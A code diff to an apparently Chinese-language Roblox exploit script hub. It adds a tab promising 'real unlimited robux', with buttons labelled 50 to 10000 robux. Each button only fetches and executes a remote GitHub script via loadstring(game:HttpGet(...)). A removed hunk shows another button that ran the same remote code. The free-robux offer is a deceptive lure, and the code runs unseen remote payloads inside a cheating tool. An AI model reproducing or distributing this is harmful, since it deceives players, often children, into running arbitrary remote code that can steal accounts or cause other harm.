@@ -512,7 +512,56 @@ end
 coroutine.wrap(QNWNII_fake_script)()
   	end    
 })
-
+local Tab = Window:MakeTab({
+	Name = "无限robux",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "此脚本为真实无限robux"
+})
+Tab:AddButton({
+	Name = "50robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "100robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "450robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "500robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "1000robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "5000robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
+Tab:AddButton({
+	Name = "10000robux",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
+  	end    
+})
 local Tab = Window:MakeTab({
 	Name = "evade",
 	Icon = "rbxassetid://4483345998",
@@ -5637,12 +5686,7 @@ local Tab = Window:MakeTab({
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
-Tab:AddButton({
-	Name = "国内个大脚本破解",
-	Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/canxiaoxue666/ScriptVVVVVVVVVV/refs/heads/main/FreeScript"))()
-  	end    
-})
+
 
  
 
